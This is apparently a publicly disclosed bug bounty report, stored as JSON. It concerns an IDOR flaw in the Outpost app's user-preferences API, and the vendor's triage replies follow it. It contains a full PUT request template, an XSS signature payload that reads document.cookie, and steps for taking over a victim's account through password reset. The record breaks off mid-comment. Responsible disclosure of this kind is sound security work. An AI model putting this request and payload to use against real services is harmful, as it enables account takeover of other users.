{"id":854290,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTQyOTA=","url":"https://hackerone.com/reports/854290","title":"IDOR on update user preferences","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-04-20T14:37:10.118Z","submitted_at":"2020-04-20T14:37:10.118Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"macasun","url":"/macasun","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":42327,"url":"https://hackerone.com/palo_alto_software","handle":"palo_alto_software","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/042/327/6b83191758494b9c630b6ba94f088d0c78829602_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/327/6b83191758494b9c630b6ba94f088d0c78829602_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Palo Alto Software","twitter_handle":null,"website":"http://paloalto.com","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-05-13T19:52:07.215Z","bug_reporter_agreed_on_going_public_at":"2020-05-13T13:13:39.249Z","team_member_agreed_on_going_public_at":"2020-05-13T19:52:07.147Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nTeam member with role USER can change data of any user in the team, or steal his cookies, or steal the account of victim via forget password function.\n\n## Steps To Reproduce:\n\n  1. Login in as user1 (the user with role `admin`) and invite user2 (set his role to `user`).\n  2. Login in as user2, open Mail tab and select user1 from `Conversation assignment` dropdown (see F796149 attachment).\n  3. Open network tools in the browser devTools or open local proxy and copy `UserUuid` (`da4f313f-e21e-4b5f-b2da-42d9864716f6` in my case) of the user1 from the following request: https://api.outpost.co/api/v1/conversation/assigned?assignedToUserUuid=da4f313f-e21e-4b5f-b2da-42d9864716f6.\n  4. Use template `request1` to create http request. Change `{user1-uuid}` to user1 Uuid, `{user2-cookie}` to user2 cookie. In the request body: `{attacker-email}` to email controlled by user2, `signature` to the following: `\u003cp style=\\\"margin:0;\\\"\u003eUser Signature2\u003cimg src=x onerror=alert(document.cookie) \u003e\u003c/p\u003e`. Send request.\n  5. Login in as user1. Open https://app.outpost.co/settings/preferences, alert with user1 cookie will appear (see F796148 attachment).\n  6. Open https://app.outpost.co/sign-in/help and paste `{attacker-email}`. Open email client, click the link to restore password, enter a new password. Now you can login in using user1 email address and password entered on the previos step.\n\n## Supporting Material/References:\n\n- request1 template:\n\n```\nPUT /api/v1/user/preferences/{user1-uuid} HTTP/2.0\nHost: api.outpost.co\nContent-Length: 434\nSec-Fetch-Dest: empty\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36\nDnt: 1\nContent-Type: application/json\nAccept: */*\nOrigin: https://app.outpost.co\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: cors\nReferer: https://app.outpost.co/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7\nCookie: auth={user2-cookie}\n\n{\n  \"firstName\": \"user1-changed-by-user2\",\n  \"lastName\": \"null\",\n  \"email\": \"{attacker-email}\",\n  \"role\": \"USER\",\n  \"defaultMailboxUuid\": \"\",\n  \"mailboxUuids\": [\n    \"e4a63ae3-bb10-46f8-be28-a2660a2344ec\"\n  ],\n  \"signature\": \"{signature}\",\n  \"timezone\": \"Europe/Moscow\",\n  \"defaultSendAndResolve\": false,\n  \"selectFirstConversation\": true\n}\n```\n\n## Impact\n\nAn attacker can change data of any user in the team, or steal his cookies, or steal account of victim via forget password function.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eTeam member with role USER can change data of any user in the team, or steal his cookies, or steal the account of victim via forget password function.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eLogin in as user1 (the user with role \u003ccode\u003eadmin\u003c/code\u003e) and invite user2 (set his role to \u003ccode\u003euser\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eLogin in as user2, open Mail tab and select user1 from \u003ccode\u003eConversation assignment\u003c/code\u003e dropdown (see \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"s1.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/TGpp6b4w7tYTrJjYfZADNLWJ?response-content-disposition=attachment%3B%20filename%3D%22s1.jpg%22%3B%20filename%2A%3DUTF-8%27%27s1.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070152Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026amp;X-Amz-Signature=69300a6c6645ad97a108cfdd80ed48405c38c5876d41ea58e8fb03951ff5e710\" data-attachment-type=\"image/jpeg\"\u003es1.jpg (F796149)\u003c/a\u003e attachment).\u003c/li\u003e\n\u003cli\u003eOpen network tools in the browser devTools or open local proxy and copy \u003ccode\u003eUserUuid\u003c/code\u003e (\u003ccode\u003eda4f313f-e21e-4b5f-b2da-42d9864716f6\u003c/code\u003e in my case) of the user1 from the following request: \u003ca title=\"https://api.outpost.co/api/v1/conversation/assigned?assignedToUserUuid=da4f313f-e21e-4b5f-b2da-42d9864716f6\" href=\"/redirect?url=https%3A%2F%2Fapi.outpost.co%2Fapi%2Fv1%2Fconversation%2Fassigned%3FassignedToUserUuid%3Dda4f313f-e21e-4b5f-b2da-42d9864716f6\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.outpost.co/api/v1/conversation/assigned?assignedToUserUuid=da4f313f-e21e-4b5f-b2da-42d9864716f6\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/li\u003e\n\u003cli\u003eUse template \u003ccode\u003erequest1\u003c/code\u003e to create http request. Change \u003ccode\u003e{user1-uuid}\u003c/code\u003e to user1 Uuid, \u003ccode\u003e{user2-cookie}\u003c/code\u003e to user2 cookie. In the request body: \u003ccode\u003e{attacker-email}\u003c/code\u003e to email controlled by user2, \u003ccode\u003esignature\u003c/code\u003e to the following: \u003ccode\u003e\u0026lt;p style=\\\u0026quot;margin:0;\\\u0026quot;\u0026gt;User Signature2\u0026lt;img src=x onerror=alert(document.cookie) \u0026gt;\u0026lt;/p\u0026gt;\u003c/code\u003e. Send request.\u003c/li\u003e\n\u003cli\u003eLogin in as user1. Open \u003ca title=\"https://app.outpost.co/settings/preferences\" href=\"/redirect?url=https%3A%2F%2Fapp.outpost.co%2Fsettings%2Fpreferences\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.outpost.co/settings/preferences\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, alert with user1 cookie will appear (see \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"s2.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Y3B2MPEgJGngTmZzjwkacAiU?response-content-disposition=attachment%3B%20filename%3D%22s2.jpg%22%3B%20filename%2A%3DUTF-8%27%27s2.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070152Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026amp;X-Amz-Signature=75b65c0bedfa8031c3d06fbc26361190a5eced3044e4bccde6a91635d3b8aceb\" data-attachment-type=\"image/jpeg\"\u003es2.jpg (F796148)\u003c/a\u003e attachment).\u003c/li\u003e\n\u003cli\u003eOpen \u003ca title=\"https://app.outpost.co/sign-in/help\" href=\"/redirect?url=https%3A%2F%2Fapp.outpost.co%2Fsign-in%2Fhelp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.outpost.co/sign-in/help\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and paste \u003ccode\u003e{attacker-email}\u003c/code\u003e. Open email client, click the link to restore password, enter a new password. Now you can login in using user1 email address and password entered on the previos step.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003erequest1 template:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePUT /api/v1/user/preferences/{user1-uuid} HTTP/2.0\nHost: api.outpost.co\nContent-Length: 434\nSec-Fetch-Dest: empty\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36\nDnt: 1\nContent-Type: application/json\nAccept: */*\nOrigin: https://app.outpost.co\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: cors\nReferer: https://app.outpost.co/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7\nCookie: auth={user2-cookie}\n\n{\n  \u0026quot;firstName\u0026quot;: \u0026quot;user1-changed-by-user2\u0026quot;,\n  \u0026quot;lastName\u0026quot;: \u0026quot;null\u0026quot;,\n  \u0026quot;email\u0026quot;: \u0026quot;{attacker-email}\u0026quot;,\n  \u0026quot;role\u0026quot;: \u0026quot;USER\u0026quot;,\n  \u0026quot;defaultMailboxUuid\u0026quot;: \u0026quot;\u0026quot;,\n  \u0026quot;mailboxUuids\u0026quot;: [\n    \u0026quot;e4a63ae3-bb10-46f8-be28-a2660a2344ec\u0026quot;\n  ],\n  \u0026quot;signature\u0026quot;: \u0026quot;{signature}\u0026quot;,\n  \u0026quot;timezone\u0026quot;: \u0026quot;Europe/Moscow\u0026quot;,\n  \u0026quot;defaultSendAndResolve\u0026quot;: false,\n  \u0026quot;selectFirstConversation\u0026quot;: true\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can change data of any user in the team, or steal his cookies, or steal account of victim via forget password function.\u003c/p\u003e\n","weakness":{"id":55,"name":"Insecure Direct Object Reference (IDOR)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":796148,"file_name":"s2.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Y3B2MPEgJGngTmZzjwkacAiU?response-content-disposition=attachment%3B%20filename%3D%22s2.jpg%22%3B%20filename%2A%3DUTF-8%27%27s2.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070152Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026X-Amz-Signature=75b65c0bedfa8031c3d06fbc26361190a5eced3044e4bccde6a91635d3b8aceb","file_size":313887,"type":"image/jpeg"},{"id":796149,"file_name":"s1.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/TGpp6b4w7tYTrJjYfZADNLWJ?response-content-disposition=attachment%3B%20filename%3D%22s1.jpg%22%3B%20filename%2A%3DUTF-8%27%27s1.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070152Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026X-Amz-Signature=69300a6c6645ad97a108cfdd80ed48405c38c5876d41ea58e8fb03951ff5e710","file_size":412260,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2020-06-12T13:13:39.310Z","allow_singular_disclosure_after":-17257693.332959242,"singular_disclosure_allowed":true,"vote_count":7,"voters":["mik317","brahim_boufakri01","mygf","hodkasia_sachin","klau5","r4sk0ln1k0v","themagicnacho"],"severity":{"rating":"critical","score":10.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"low","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":35341,"asset_type":"URL","asset_identifier":"app.outpost.co","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7729652,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@alexandermac05, thanks for the report! Can you clarify steps 5 and 6?\n\nIn step 5, were you able to harvest user1's cookie and make authenticated requests with it?\n\nIn step 6, are you saying that if you are already logged in as user1, and enter user2's email in the forgot password form, that user2 will get an email to reset user1's password?\n\nThanks again for hacking on our systems.","markdown_message":"\u003cp\u003e\u003ca href=\"/alexandermac05\"\u003e@alexandermac05\u003c/a\u003e, thanks for the report! Can you clarify steps 5 and 6?\u003c/p\u003e\n\n\u003cp\u003eIn step 5, were you able to harvest user1\u0026#39;s cookie and make authenticated requests with it?\u003c/p\u003e\n\n\u003cp\u003eIn step 6, are you saying that if you are already logged in as user1, and enter user2\u0026#39;s email in the forgot password form, that user2 will get an email to reset user1\u0026#39;s password?\u003c/p\u003e\n\n\u003cp\u003eThanks again for hacking on our systems.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-20T19:40:40.009Z","updated_at":"2020-04-20T19:40:40.009Z","actor":{"username":"kad3nce","cleared":false,"url":"/kad3nce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7729917,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@kad3nce thanks for the response.\n\n\u003e In step 5, were you able to harvest user1's cookie and make authenticated requests with it?\n\nNo, this is impossible. Your app stores `auth` cookie on the different domain - `.appcues.com`, so this is impossible to get them using provided XSS, but I guess this possible with another technique, maybe injected iFrame. \n\n\u003e In step 6, are you saying that if you are already logged in as user1, and enter user2's email in the forgot password form, that user2 will get an email to reset user1's password?\n\nSorry, for inaccurate explanation, in steps 4 and 6 you should use email address that is controlled by user2, but that is **not** email used for registration on outpost.co. For example, if he used user2@mail.com for registration, on steps 4 and 6 he can use user2222@mail.com.\n\nBest regards,\nAlex.","markdown_message":"\u003cp\u003e\u003ca href=\"/kad3nce\"\u003e@kad3nce\u003c/a\u003e thanks for the response.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIn step 5, were you able to harvest user1\u0026#39;s cookie and make authenticated requests with it?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eNo, this is impossible. Your app stores \u003ccode\u003eauth\u003c/code\u003e cookie on the different domain - \u003ccode\u003e.appcues.com\u003c/code\u003e, so this is impossible to get them using provided XSS, but I guess this possible with another technique, maybe injected iFrame. \u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIn step 6, are you saying that if you are already logged in as user1, and enter user2\u0026#39;s email in the forgot password form, that user2 will get an email to reset user1\u0026#39;s password?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eSorry, for inaccurate explanation, in steps 4 and 6 you should use email address that is controlled by user2, but that is \u003cstrong\u003enot\u003c/strong\u003e email used for registration on outpost.co. For example, if he used \u003ca title=\"user2@mail.com\" href=\"mailto:user2@mail.com\" rel=\"nofollow noopener noreferrer\"\u003euser2@mail.com\u003c/a\u003e for registration, on steps 4 and 6 he can use \u003ca title=\"user2222@mail.com\" href=\"mailto:user2222@mail.com\" rel=\"nofollow noopener noreferrer\"\u003euser2222@mail.com\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nAlex.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-20T20:05:20.300Z","updated_at":"2020-04-20T20:05:20.300Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7731863,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the follow-up, @alexandermac05. This is the first report of the privilege escalation issue in the API. We do have another report of the XSS vulnerability in the signature editor. We'll get a fix in the queue for the priv escalation and will report back once it's resolved.\n\nThanks again!","markdown_message":"\u003cp\u003eThanks for the follow-up, \u003ca href=\"/alexandermac05\"\u003e@alexandermac05\u003c/a\u003e. This is the first report of the privilege escalation issue in the API. We do have another report of the XSS vulnerability in the signature editor. We\u0026#39;ll get a fix in the queue for the priv escalation and will report back once it\u0026#39;s resolved.\u003c/p\u003e\n\n\u003cp\u003eThanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-20T23:58:29.281Z","updated_at":"2020-04-20T23:58:29.281Z","actor":{"username":"kad3nce","cleared":false,"url":"/kad3nce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7733818,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@kad3nce ok, thanks for the update.","markdown_message":"\u003cp\u003e\u003ca href=\"/kad3nce\"\u003e@kad3nce\u003c/a\u003e ok, thanks for the update.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-21T07:11:57.708Z","updated_at":"2020-04-21T07:11:57.708Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7968168,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@macasun, the fix for this has been deployed. Have a good one!","markdown_message":"\u003cp\u003e\u003ca href=\"/macasun\"\u003e@macasun\u003c/a\u003e, the fix for this has been deployed. Have a good one!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-11T22:07:14.550Z","updated_at":"2020-05-11T22:07:14.550Z","actor":{"username":"kad3nce","cleared":false,"url":"/kad3nce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"macasun","url":"/macasun"},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7989044,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@kad3nce thanks for the good 